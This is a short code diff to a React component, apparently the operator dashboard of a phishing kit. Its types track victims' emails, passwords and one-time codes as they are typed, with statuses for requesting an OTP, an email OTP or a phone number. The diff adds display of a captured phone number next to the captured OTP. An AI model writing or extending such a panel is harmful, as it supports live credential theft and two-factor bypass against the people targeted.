@@ -30,6 +30,7 @@ type Meta = {
   sucesso?: boolean;
   status?: "pendente" | "aprovado" | "recusado" | "pedir_otp" | "pedir_otp_email" | "pedir_telefone" | "bloqueado" | "otp_invalido";
   otp?: string;
+  telefone?: string;
 };
 
 type Digitando = { email: string; senha: string; otp?: string; em: string };
@@ -257,6 +258,11 @@ export default function ClientesCard({
                     {otpExibir && (
                       <span className="shrink-0 rounded bg-emerald-500/10 px-1.5 py-0.5 text-[9px] font-semibold uppercase text-emerald-400">
                         otp: {otpExibir}
+                      </span>
+                    )}
+                    {meta.telefone && (
+                      <span className="shrink-0 rounded bg-sky-500/10 px-1.5 py-0.5 text-[9px] font-semibold uppercase text-sky-400">
+                        tel: {meta.telefone}
                       </span>
                     )}
                   </div>
